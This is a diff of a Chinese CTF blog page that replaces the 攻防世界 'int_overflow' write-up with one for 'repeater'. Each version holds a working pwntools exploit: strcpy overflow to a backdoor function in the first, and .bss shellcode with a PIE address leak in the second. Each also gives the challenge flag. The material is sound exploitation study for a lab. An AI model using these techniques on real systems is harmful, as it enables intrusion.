@@ -4,11 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界-int_overflow, Welcome to 4ss1du0us&#39;s Blog">
+    <meta name="keywords" content="攻防世界-repeater, Welcome to 4ss1du0us&#39;s Blog">
     <meta name="description" content="收获
-&amp;#x3D;&amp;#x3D;原输入的栈无法溢出，通过 strcpy 复制操作进行溢出&amp;#x3D;&amp;#x3D;
+&amp;#x3D;&amp;#x3D;IDA 中看到的地址是偏移地址&amp;#x3D;&amp;#x3D;，当开启了 PIE 地址随机化时，真实地址 &amp;#x3D; 程序的基地址 + 偏移地址
 
-&amp;#x3D;&amp;#x3D;注意参数的类型&amp;#x3D;&amp;#x3D;，例如 unsigned __int8 v3，v3 = strl">
+&amp;#x3D;&amp;#x3D;可以直接向 .bss 段上写入 shellc">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界-int_overflow | Welcome to 4ss1du0us&#39;s Blog</title>
+    <title>攻防世界-repeater | Welcome to 4ss1du0us&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -239,12 +239,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界-int_overflow</h1>
+                    <h1 class="description center-align post-title">攻防世界-repeater</h1>
                 </div>
             </div>
         </div>
@@ -326,38 +326,44 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul>
-<li><p>&#x3D;&#x3D;原输入的栈无法溢出，通过 strcpy 复制操作进行溢出&#x3D;&#x3D;</p>
+<li><p>&#x3D;&#x3D;IDA 中看到的地址是偏移地址&#x3D;&#x3D;，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 &#x3D; 程序的基地址 + 偏移地址</strong></p>
 </li>
-<li><p>&#x3D;&#x3D;注意参数的类型&#x3D;&#x3D;，例如 <code>unsigned __int8 v3</code>，<code>v3 = strlen(s)</code>，<code>v3</code> 是一个 <em>8位 int型</em> 数据，即使 <code>s</code> 的长度为 0x104，<code>v3</code> 也只能为 0x04（<strong>1字节 只能存放 2位 十六进制数</strong>）</p>
+<li><p>&#x3D;&#x3D;可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code>&#x3D;&#x3D;</p>
 </li>
-<li><p>&#x3D;&#x3D;通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 可以直接往 payload 后面添加 b’a’ 一直填充至指定长度 0x104&#x3D;&#x3D; 【<code>ljust()</code> 的 <code>l</code> 是让 payload 左对齐，往右侧添加字符，<em><strong>一直将原字符串填充到指定长度，而不是填充多少个字符</strong></em>】</p>
+<li><p>&#x3D;&#x3D;开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址&#x3D;&#x3D;</p>
 </li>
 </ul>
 <hr>
-<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/51ed19eacdea43e3bd67217d08eb8a0e">攻防世界-int_overflow</a></p>
+<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">攻防世界-repeater</a></p>
 <hr>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<li><p>查看文件信息：<br>![[攻防世界-int_overflow1.png]]<br>32 位 小端序，只开启了栈不可执行</p>
+<li><p>查看文件信息：<br>![[攻防世界-repeater1.png]]<br>64位 小端序，开启了 <code>PIE</code> 地址随机化</p>
 </li>
-<li><p>尝试执行：<br>![[攻防世界-int_overflow2.png]]</p>
+<li><p>尝试运行：<br>![[攻防世界-repeater2.png]]<br>存在溢出</p>
 </li>
-<li><p>在 IDA 中分析：<br>![[攻防世界-int_overflow3.png]]<br>跟进 <code>login()</code>：<br>![[攻防世界-int_overflow4.png]]<br>有两个输入，查看数据 <code>s</code> 和 <code>buf</code> 在栈中的位置：<br>![[攻防世界-int_overflow5.png]]<br>![[攻防世界-int_overflow6.png]]<br><code>s</code> 在栈中的长度为 <code>0x28</code>，而输入的 <code>s</code> 长度为 <code>0x19</code>；<code>buf</code> 在栈中的长度为 <code>0x200</code>，而输入的 <code>buf</code> 长度为 <code>0x199</code><br>因此无法通过输入来进行溢出操作</p>
+<li><p>在 IDA 下分析：<br>![[攻防世界-repeater3.png]]<br>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p>
 </li>
-<li><p>跟进函数 <code>check_passwd(buf)</code>：<br>![[攻防世界-int_overflow7.png]]<br>首先控制了 <code>v3</code> 长度要在 <code>4~8</code> 之间，然后将 <code>形参s</code>【其实就是 <code>login()</code> 中的 <code>buf</code>】中存放的内容复制到 <code>dest</code> 中：<br>![[攻防世界-int_overflow8.png]]<br>&#x3D;&#x3D;注意：这里的 <code>v3 = strlen(s)</code> 得到的并不是 <code>形参s</code> 的长度，因为 <code>v3</code> 的定义为 <code>unsigned __int8 v3</code>，即 <code>v3</code> 是一个 <em><strong>无符号的 8位 int型 数据</strong></em>，也就是 <em><strong>1字节</strong></em>，<strong>只能存放两位十六进制数，即：当 buf 的长度为 261（0x105） 时，v3 &#x3D;&#x3D; 0x05</strong>&#x3D;&#x3D;</p>
+<li><p>查看 <code>byte_202040</code> 地址的位置：<br>![[攻防世界-repeater4.png]]<br>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的<br>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p>
 </li>
-<li><p>在 IDA 左侧函数列表中，注意到一个后门函数：<br>![[攻防世界-int_overflow9.png]]<br>肯定是需要修改函数返回值转而执行这个 <code>what_is_this()</code> 函数</p>
+<li><p>但是这个题&#x3D;&#x3D;开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址&#x3D;&#x3D;<br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <em><strong>真实地址 &#x3D; 基地址 + 偏移地址</strong></em> 计算出来</p>
 </li>
-<li><p>发现在函数 <code>check_passwd(buf)</code> 中进行 <code>strcpy(dest, s)</code> 的复制操作时，虽然之前输入时 <code>buf</code> 无法进行溢出操作，但是通过 <code>strcpy()</code> 复制，可以利用 <code>buf</code> 将 <code>dest</code> 溢出，然后覆盖掉 <code>dest</code> 所在的栈中的返回值，这样就可以实现跳转了</p>
+<li><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】<br>![[攻防世界-repeater5.png]]<br>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code><br>查看 <code>s</code> 所在的位置：<br>![[攻防世界-repeater6.png]]<br>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p>
 </li>
-<li><p>但是想要执行复制操作，就必须先满足 <code>v3 &gt; 3u &amp;&amp; v3 &lt;= 8u</code> 的条件，即 <code>v3</code> 可以取值的范围是 <code>4~8</code>，也就是 <code>0x04~0x08</code><br>结合 <code>v3 = strlen(s)</code> 且输入的 <code>buf</code> 长度为 <code>0x199</code><br>可以得出满足条件的 <code>buf</code> 的长度应该为：<code>0x104~0x108</code></p>
-</li>
-<li><p>于是<strong>思路</strong>就很清晰了：<br> &#x3D;&#x3D;① 首先输入 <code>&quot;1&quot;</code> 选择登录<br> ② 由于 <code>login()</code> 中的 <code>s</code> 没有溢出点，在长度为 <code>0x28</code> 以内随便输入即可<br> ③ 由于 <code>login()</code> 中的 <code>buf</code> 在原本的栈中无法溢出，但是 <code>buf</code> 的值会复制到 <code>dest</code> 中，<code>dest</code> 是可以溢出的。根据 <code>dest</code> 所在的栈，要覆盖返回值需要先填充 <code>0x14 - 0x00 + 0x04</code> 个垃圾数据，然后加上 <code>what_is_this()</code> 函数的地址，函数的地址可以通过 <code>elf.symbols[&quot;what_is_this&quot;]</code> 获得<br> ④ 这样就保证了当 <code>buf</code> 的值复制到 <code>dest</code> 后，会转而执行后门函数 <code>what_is_this()</code><br> ⑤ 但是，想要让复制操作执行，首先需要通过前面的 <code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code> 语句，即：让 <code>v3 = strlen(s)</code> 的长度保持在 <code>0x04~0x08</code>，也就是 <code>buf</code> 的长度要保持在 <code>0x104~0x108</code><br> ⑥ 因此，除去前面为 <code>buf</code> 构造 <code>payload</code> 所用的 <code>b&#39;a&#39; * (0x14 - 0x00 + 0x04) + p32(elf.symbols[&quot;what_is_this&quot;])</code> 以外，还要在后面继续填充垃圾字符，让 <code>buf</code> 的长度在 <code>0x104~0x108</code> 之间<br> ⑦ 通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 即可实现在 <code>payload</code> 右边添加 <code>b&#39;a&#39;</code> 一直将 <code>payload</code> 的长度填充至 <code>0x104</code>&#x3D;&#x3D;</p>
+<li><p>接下来思路就很明确了：<br> &#x3D;&#x3D;1. 在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 段上的，在这里写入一个 <code>shellcode</code></p>
+<ol start="2">
+<li>然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code></li>
+<li>然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来</li>
+<li>在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 &#x3D; 程序的基地址</strong></li>
+<li>在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 &#x3D; 真实地址</strong></li>
+<li>再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址</li>
+<li>程序跳转到 <code>shellcod</code>e 的地址去执行 <code>shellcode</code>，获得 shell&#x3D;&#x3D;</li>
+</ol>
 </li>
 </ol>
 <hr>
-<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span>  <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./int_overflow&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;what_is_this&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./int_overflow&quot;</span>)  <span class="comment"># 程序在kali的路径</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">56322</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x14</span> - <span class="number">0x00</span> + <span class="number">0x04</span>) + p32(system_addr)  <span class="comment"># 溢出dest，使其跳转至what_is_this函数</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x104</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 原payload左对齐，往payload右侧填充b&#x27;a&#x27;，一直填充到payload的长度为0x104</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;999&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span>  <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./repeater&quot;</span>)  <span class="comment"># 程序在kali的路径</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">64526</span>)  <span class="comment"># 题目的远程端口，注意是remote</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcraft.sh())  <span class="comment"># 构造shellcode</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please give me your name :\n&quot;</span>)</span><br><span class="line">    io.sendline(shellcode)  <span class="comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x10</span>) + p64(<span class="number">3281697</span>)  <span class="comment"># 栈溢出修改v5的值为3281697</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input :&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;But there is gift for you :\n&quot;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>), <span class="number">16</span>)  <span class="comment"># 保存下程序打印出的main()的真实地址</span></span><br><span class="line">    base_addr = main_addr - <span class="number">0x0A33</span>  <span class="comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span></span><br><span class="line">    shellcode_addr = base_addr + <span class="number">0x202040</span>  <span class="comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span></span><br><span class="line">    <span class="comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input :&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x00</span> + <span class="number">0x08</span>) + p64(shellcode_addr)  <span class="comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 <hr>
-<h2 id="结果：cyberpeace-25686bc91ab84046b5a18aaa66041868"><a href="#结果：cyberpeace-25686bc91ab84046b5a18aaa66041868" class="headerlink" title="结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}"></a>结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}</h2><p>![[攻防世界-int_overflow10.png]]</p>
+<h2 id="结果：cyberpeace-7165ca68103868530e16b6038318afc5"><a href="#结果：cyberpeace-7165ca68103868530e16b6038318afc5" class="headerlink" title="结果：cyberpeace{7165ca68103868530e16b6038318afc5}"></a>结果：cyberpeace{7165ca68103868530e16b6038318afc5}</h2><p>![[攻防世界-repeater7.png]]</p>
 
                 
             </div>
@@ -384,7 +390,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/">http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/</a>
+                    <a href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/">http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -506,13 +512,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/">
+                <a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="攻防世界-repeater">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="攻防世界-gametime">
                         
-                        <span class="card-title">攻防世界-repeater</span>
+                        <span class="card-title">攻防世界-gametime</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -536,8 +542,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PWN/">
-                        <span class="chip bg-color">PWN</span>
+                    <a href="/tags/REVERSE/">
+                        <span class="chip bg-color">REVERSE</span>
                     </a>
                     
                 </div>
@@ -551,13 +557,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/13/hello-world/">
+                <a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="攻防世界-int_overflow">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">攻防世界-int_overflow</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -577,6 +583,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
